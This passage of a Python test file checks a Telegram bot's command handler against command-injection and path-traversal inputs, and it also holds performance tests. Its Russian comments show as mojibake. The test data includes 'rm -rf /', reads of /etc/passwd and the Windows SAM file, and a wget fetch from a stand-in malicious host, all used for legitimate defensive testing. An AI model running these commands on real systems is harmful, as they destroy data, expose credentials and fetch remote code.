                state_manager=mock_state_manager,
                exchange_client=mock_exchange_client,
                train_func=mock_train_func,
                chat_id="123"
            )
            
            # РљРѕРјР°РЅРґС‹ РґРѕР»Р¶РЅС‹ РѕР±СЂР°Р±Р°С‚С‹РІР°С‚СЊСЃСЏ Р±РµР·РѕРїР°СЃРЅРѕ
            mock_send.assert_called_once()
    
    @patch('telegram.api_utils.send_message')
    def test_command_injection_attempt(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """РўРµСЃС‚РёСЂСѓРµС‚ РїРѕРїС‹С‚РєРё command injection"""
        injection_commands = [
            "/price && rm -rf /",
            "/testbuy 100 | cat /etc/passwd",
            "/status; wget malicious.com/script.sh",
        ]
        
        for cmd in injection_commands:
            mock_send.reset_mock()
            tg_commands.process_command(
                text=cmd,
                state_manager=mock_state_manager,
                exchange_client=mock_exchange_client,
                train_func=mock_train_func,
                chat_id="123"
            )
            
            # РљРѕРјР°РЅРґС‹ РґРѕР»Р¶РЅС‹ РѕР±СЂР°Р±Р°С‚С‹РІР°С‚СЊСЃСЏ Р±РµР·РѕРїР°СЃРЅРѕ
            mock_send.assert_called_once()
    
    @patch('telegram.api_utils.send_message')
    def test_path_traversal_attempt(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """РўРµСЃС‚РёСЂСѓРµС‚ РїРѕРїС‹С‚РєРё path traversal"""
        traversal_commands = [
            "/config ../../etc/passwd",
            "/chart ../../../secret.txt",
            "/stats ../../../../windows/system32/config/sam",
        ]
        
        for cmd in traversal_commands:
            mock_send.reset_mock()
            tg_commands.process_command(
                text=cmd,
                state_manager=mock_state_manager,
                exchange_client=mock_exchange_client,
                train_func=mock_train_func,
                chat_id="123"
            )
            
            # РљРѕРјР°РЅРґС‹ РґРѕР»Р¶РЅС‹ РѕР±СЂР°Р±Р°С‚С‹РІР°С‚СЊСЃСЏ Р±РµР·РѕРїР°СЃРЅРѕ
            mock_send.assert_called_once()


# Р¤РёРЅР°Р»СЊРЅС‹Р№ С‚РµСЃС‚ РїСЂРѕРёР·РІРѕРґРёС‚РµР»СЊРЅРѕСЃС‚Рё
class TestPerformance:
    """РўРµСЃС‚С‹ РїСЂРѕРёР·РІРѕРґРёС‚РµР»СЊРЅРѕСЃС‚Рё РєРѕРјР°РЅРґ"""
    
    @patch('telegram.api_utils.send_message')
    def test_command_response_time(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """РўРµСЃС‚РёСЂСѓРµС‚ РІСЂРµРјСЏ РѕС‚РєР»РёРєР° РєРѕРјР°РЅРґ"""
        import time
        
        commands = ["/help", "/status", "/balance", "/price", "/stats"]
        
        for cmd in commands:
            start_time = time.time()
            
            tg_commands.process_command(
                text=cmd,
                state_manager=mock_state_manager,
                exchange_client=mock_exchange_client,
                train_func=mock_train_func,
                chat_id="123"
            )
            
            end_time = time.time()
            response_time = end_time - start_time
            
            # РљРѕРјР°РЅРґС‹ РґРѕР»Р¶РЅС‹ РІС‹РїРѕР»РЅСЏС‚СЊСЃСЏ Р±С‹СЃС‚СЂРѕ (< 1 СЃРµРєСѓРЅРґС‹ РІ С‚РµСЃС‚Р°С…)
            assert response_time < 1.0, f"Command {cmd} took too long: {response_time:.2f}s"
    
    @patch('telegram.api_utils.send_message')
    def test_memory_usage_stability(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """РўРµСЃС‚РёСЂСѓРµС‚ СЃС‚Р°Р±РёР»СЊРЅРѕСЃС‚СЊ РёСЃРїРѕР»СЊР·РѕРІР°РЅРёСЏ РїР°РјСЏС‚Рё"""
        import gc
        
        # Р—Р°РїСѓСЃРєР°РµРј РјРЅРѕРіРѕ РєРѕРјР°РЅРґ РїРѕРґСЂСЏРґ
        for i in range(100):
            tg_commands.process_command(
                text=f"/help {i}",
                state_manager=mock_state_manager,
                exchange_client=mock_exchange_client,
                train_func=mock_train_func,
                chat_id="123"
            )
            
            # РџРµСЂРёРѕРґРёС‡РµСЃРєРё Р·Р°РїСѓСЃРєР°РµРј СЃР±РѕСЂРєСѓ РјСѓСЃРѕСЂР°
            if i % 10 == 0:
                gc.collect()
        
        # РџСЂРѕРІРµСЂСЏРµРј С‡С‚Рѕ РІСЃРµ РєРѕРјР°РЅРґС‹ РІС‹РїРѕР»РЅРёР»РёСЃСЊ
        assert mock_send.call_count == 100


